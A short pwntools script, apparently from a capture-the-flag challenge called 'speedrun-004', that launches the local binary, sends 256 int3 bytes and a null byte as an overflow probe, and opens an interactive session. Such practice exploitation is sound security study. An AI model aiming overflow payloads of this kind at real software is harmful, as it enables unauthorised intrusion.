from pwn import *

target = process("./speedrun-004")

target.sendline("\xcc" * 256 + '\x00')
target.interactive()
